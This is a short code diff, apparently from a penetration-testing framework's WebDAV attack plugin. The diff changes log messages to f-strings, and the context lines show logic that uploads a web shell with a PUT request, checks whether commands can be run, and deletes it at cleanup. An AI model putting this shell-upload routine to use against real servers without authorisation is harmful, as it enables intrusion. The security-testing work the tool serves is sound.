@@ -92,13 +92,13 @@ class dav(AttackPlugin):
         for file_content, real_extension in shell_list:
             if extension == "":
                 extension = real_extension
-            om.out.debug('Uploading shell with extension: "%s".' % extension)
+            om.out.debug(f'Uploading shell with extension: "{extension}".')
 
             # Upload the shell
-            fname = "%s.%s" % (filename, extension)
+            fname = f"{filename}.{extension}"
             url_to_upload = vuln_obj.get_url().url_join(fname)
 
-            om.out.debug("Uploading file %s using PUT method." % url_to_upload)
+            om.out.debug(f"Uploading file {url_to_upload} using PUT method.")
             self._uri_opener.PUT(url_to_upload, data=file_content)
 
             # Verify if I can execute commands
@@ -180,9 +180,9 @@ class DAVShell(ExecShell):
         try:
             self._uri_opener.DELETE(url_to_del)
         except BaseFrameworkException as e:
-            om.out.error('DAVShell cleanup failed with exception: "%s".' % e)
+            om.out.error(f'DAVShell cleanup failed with exception: "{e}".')
         else:
-            om.out.debug("DAVShell cleanup complete, %s deleted." % url_to_del)
+            om.out.debug(f"DAVShell cleanup complete, {url_to_del} deleted.")
 
     def get_name(self):
         return "dav"
